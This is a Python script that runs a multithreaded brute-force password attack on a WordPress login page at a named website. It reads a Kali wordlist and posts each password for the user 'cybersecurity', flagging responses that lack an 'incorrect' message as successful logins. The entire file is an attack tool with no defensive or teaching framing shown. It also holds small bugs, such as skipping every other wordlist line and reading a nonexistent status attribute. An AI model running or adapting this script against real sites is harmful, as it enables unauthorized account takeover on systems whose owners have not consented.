import requests
import concurrent
from concurrent.futures import ThreadPoolExecutor

def get_post_data(password):
    data = {
        'log': 'cybersecurity',
        'pwd': f'{password}',
        'wp-submit': 'Log In',
        'redirect_to': 'https://rs11.glorifykickstarter.com/wp-admin.php',
        'testcookie': '1'
        }
    return data

def guess_password(bruteforce_url, data, headers, cookies):
    response = requests.post(
        url=bruteforce_url, data=data, cookies=cookies, headers=headers
        )
    return response


if __name__ == "__main__":
    # initialization
    threads = 100
    bruteforce_url = 'https://rs11.glorifykickstarter.com/wp-login.php'
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
    }
    cookies = {
        'humans_21909': '1',
        'wordpress_test_cookie': 'WP Cookie check',
        'timezone': 'Africa/Cairo'
    }

    password_list = []
    # getting passwords from a file
    with open('/home/kali/wordlists/passwords-large.txt', encoding = 'utf-8') as passwords_file:
        for line in passwords_file:
            password_list.append(passwords_file.readline().strip())
    
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_url = {
            executor.submit(
                guess_password, bruteforce_url, get_post_data(password), headers, cookies
                )
            for password in password_list[200:]
            }
        for future in concurrent.futures.as_completed(future_to_url):
            try:
                response = future.result()
                if response.status_code == 200 :
                    if response.text.find('incorrect') > -1:
                        print(f'{response.status_code} but incorrect password')
                    else:
                        print(f'{response.status} with correct password! Password: {response.request.data["pwd"]}') 
                elif response.status_code == 406:
                    print(f'{response.status_code}, probably a timeout')
            except Exception as e:
                print('Looks like something went wrong:', e)
